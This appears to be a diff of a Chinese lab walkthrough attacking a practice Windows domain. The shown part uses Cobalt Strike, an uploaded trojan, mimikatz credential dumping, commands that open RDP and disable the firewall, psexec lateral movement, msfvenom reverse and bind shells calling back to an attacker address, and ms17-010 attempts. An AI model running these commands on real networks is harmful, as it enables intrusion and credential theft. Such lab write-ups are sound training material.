@@ -332,21 +332,30 @@ D:.
 ![](../../attaches/Pasted%20image%2020220914161417.png)
 ### 内网渗透
 启动CS服务端
+
 ![](../../attaches/Pasted%20image%2020220914164256.png)
+
 启动CS客户端。
 ![](../../attaches/vmware_4SGvglYN2S.png)
+
 添加监听器。
 ![](../../attaches/Pasted%20image%2020220914181611.png)
+
 生成后门。
 ![](../../attaches/Pasted%20image%2020220914180807.png)
+
 在蚁剑中上传木马。
 ![](../../attaches/Pasted%20image%2020220914182103.png)
+
 执行木马文件，CS上线。
 ![](../../attaches/Pasted%20image%2020220914182236.png)
+
 获取密码凭证。
 ![](../../attaches/Pasted%20image%2020220914183859.png)
+
 使用mimikatz抓取明文密码。
 ![](../../attaches/Pasted%20image%2020220914182914.png)
+
 观察到在god域中Administrator的密码为hongrisec@2022。执行命令开启靶机的3389端口并关闭防火墙（为了进行远程桌面连接，若只想对域进行控制此步可以省略）。
 ```
 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
@@ -356,6 +365,7 @@ netsh firewall set opmode disable   			#winsows server 2003 之前
 netsh advfirewall set allprofiles state off 	#winsows server 2003 之后
 ```
 ![](../../attaches/Pasted%20image%2020220914183429.png)
+
 执行命令查看域中的信息。
 ```
 net group /domain  #查看域内所有用户列表
@@ -366,31 +376,41 @@ net group "domain admins" /domain #查看域管理员用户
 ```
 ![](../../attaches/Pasted%20image%2020220914185811.png)
 ![](../../attaches/Pasted%20image%2020220914185908.png)
+
 远程桌面登录靶机。
 ![](../../attaches/Pasted%20image%2020220914184503.png)
 ![](../../attaches/Pasted%20image%2020220914184551.png)
+
 ipconfig得到内网网段：192.168.52.1/24。
 ![](../../attaches/Pasted%20image%2020220914185144.png)
+
 上传局域网查看器，并扫描内网存活主机。
 ![](../../attaches/Pasted%20image%2020220914190106.png)
+
 根据之前获取到的域内信息，除本机外存在域控OWA（192.168.52.138）、域成员ROOT-TVI862UBEH（192.168.52.141），并得知二者的系统信息。
 
 **路径1：**
 
 右键目标使用svc-exe进行提权看到system上线。
 ![](../../attaches/Pasted%20image%2020220914201213.png)
+
 在交互会话中键入`net view`查看域中的成员，在目标列表中可以看到新出现的目标。
 ![](../../attaches/Pasted%20image%2020220915081348.png)
 ![](../../attaches/Pasted%20image%2020220915081521.png)
+
 建立新的SMB监听器。
 ![](../../attaches/Pasted%20image%2020220914231131.png)
+
 右击域控OWA，选择横向移动-psexec，选择域控的明文密码。
 ![](../../attaches/Pasted%20image%2020220915081721.png)
 ![](../../attaches/Pasted%20image%2020220915081847.png)
+
 运行之后域控上线，权限为system。
 ![](../../attaches/Pasted%20image%2020220915082215.png)
+
 用同样的方法上线域成员。
 ![](../../attaches/Pasted%20image%2020220915083228.png)
+
 至此完成对整个域的控制。
 
 **路径2：**
@@ -403,25 +423,34 @@ set lhost 0.0.0.0
 set lport 2222
 ```
 ![](../../attaches/Pasted%20image%2020220914191551.png)
+
 在CS中新建一个监听器，payload选择foreign http，地址和端口都和kali保持一致。
 ![](../../attaches/Pasted%20image%2020220914191827.png)
+
 右键CS中的靶机选择新建会话，payload选择刚创建的Amsf。
 ![](../../attaches/Pasted%20image%2020220914191925.png)
+
 发现无论如何都不出网，尝试用msf生成木马
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.131 LPORT=2222 -f exe > shell.exe
 ```
 ![](../../attaches/Pasted%20image%2020220914200033.png)
+
 原型改为reverse_tcp，开始监听，用蚁剑上传木马并执行。
 ![](../../attaches/Pasted%20image%2020220914200135.png)
+
 msf成功收到连接。
 ![](../../attaches/Pasted%20image%2020220914200506.png)
+
 执行`migrate -N explorer.exe`迁移到不易被关闭的进程上。
 ![](../../attaches/Pasted%20image%2020220914203141.png)
+
 执行`run get_local_subnets`获得当前子网，执行`run autoroute -s 192.168.52.0/24`添加路由（background挂起会话后运行`route add 10.1.81.0/24 1`），执行`run autoroute -p`查看当前存活路由表。
 ![](../../attaches/Pasted%20image%2020220914203117.png)
+
 在win7上发现nmap，扫描一下域控开启的端口。
 ![](../../attaches/Pasted%20image%2020220914204401.png)
+
 端口445开启疑似存在ms17-010漏洞，回到msf测试一下，执行如下命令。
 ```
 background
@@ -431,6 +460,7 @@ set rhosts 192.168.52.138
 run
 ```
 ![](../../attaches/Pasted%20image%2020220914205037.png)
+
 仿佛可以利用，执行如下命令。
 ```
 search ms17-010
@@ -439,12 +469,16 @@ set payload windows/x64/meterpreter/bind_tcp
 set rhosts 192.168.52.138
 set lport 11111
 ```
+
 利用不成功，报不能建立SMBv1连接。
 ![](../../attaches/Pasted%20image%2020220914210557.png)
+
 经过百度发现需要开启postgresql服务，重新run。
 ![](../../attaches/Pasted%20image%2020220914210516.png)
+
 情况有所好转但还是不能建立连接。
 ![](../../attaches/Pasted%20image%2020220914232114.png)
+
 生成正向shell木马，和wmiexec.vbs一起用蚁剑上传到win7的C盘根目录下。
 ```
  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f exe > she11.exe
